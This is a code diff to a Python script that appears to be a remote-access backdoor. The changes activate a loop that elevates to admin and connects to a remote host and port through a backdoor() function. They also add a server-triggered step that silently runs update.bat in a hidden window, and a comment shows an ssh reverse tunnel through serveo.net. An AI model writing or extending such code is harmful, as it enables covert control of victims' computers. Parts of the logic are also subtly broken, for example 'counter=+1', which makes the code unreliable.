@@ -208,16 +208,19 @@ def check_for_updates():
     response.raise_for_status()
 
     text = response.text
-    if text == 'True':
+    if 'True' in text:
         subprocess.Popen(['cmd.exe', '/c', 'update.bat'],
                          creationflags=subprocess.CREATE_NO_WINDOW)
+        global counter
+        counter = 0
+
     elif text == 'False':
-        pass
+        counter = 0
     else:
-        pass
+        counter = 0
 
 if __name__ == "__main__":
-    get_ips_ready()
+    '''get_ips_ready()
     print(ips)
 
     counter = 20
@@ -225,9 +228,10 @@ if __name__ == "__main__":
         check_for_new_ips()
         add_all_ips(ips)
 
-    print(ips)
+    print(ips)'''
+    counter = 0
 
-    '''try:
+    try:
         try:
             run_as_admin()
         except Exception:
@@ -239,11 +243,14 @@ if __name__ == "__main__":
                 REMOTE_PORT = 55001
 
                 backdoor(REMOTE_HOST, REMOTE_PORT)
+                counter=+1
 
-            print('CYCLE')
-            time.sleep(10)
+            if counter == 1:
+                check_for_updates()
+
+
 
     except Exception:
-        print("exit")'''
+        print("exit")
 
 #ssh -R 55000:localhost:55000 serveo.net
